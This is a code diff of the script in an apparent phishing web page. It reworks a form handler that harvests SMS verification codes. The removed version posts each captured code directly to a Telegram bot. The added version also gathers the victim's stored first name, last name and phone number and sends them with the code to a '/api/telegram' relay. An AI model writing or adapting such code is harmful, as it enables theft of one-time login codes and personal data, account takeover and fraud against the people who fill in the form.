@@ -292,31 +292,33 @@
 </div>
 </footer>
 <script>
-    function validateSMS() {
-        var smsCode = document.getElementById('first_name').value;
-        var errorElement = document.getElementById('smsError');
-    
-        if (smsCode.length !== 6 || isNaN(smsCode)) {
-            errorElement.style.display = 'block';
-            return false;  // Prevent form submission
-        } else {
-            errorElement.style.display = 'none';
-    
-            // إرسال البيانات للـ Telegram مباشرة
-            const message = `Código SMS recibido: ${smsCode}`;
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message
-                })
-            }).catch(err => console.error(err));
-    
-            return true;  // يسمح بالإرسال / redirect إذا ضروري
-        }
+const smsForm = document.querySelector("#smsForm");
+
+smsForm.addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const sms_code = document.getElementById("sms_input").value;
+  const first_name = localStorage.getItem("first_name"); // لو خزنّا الاسم من الفورم الأول
+  const last_name = localStorage.getItem("last_name");
+  const num = localStorage.getItem("num");
+
+  try {
+    const response = await fetch("/api/telegram", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ first_name, last_name, num, sms_code }),
+    });
+
+    if (response.ok) {
+      alert("SMS envoyé avec succès!");
     }
-    </script>
+  } catch (err) {
+    console.error(err);
+  }
+});
+</script>
+
     </body>
 </html>
 x
+
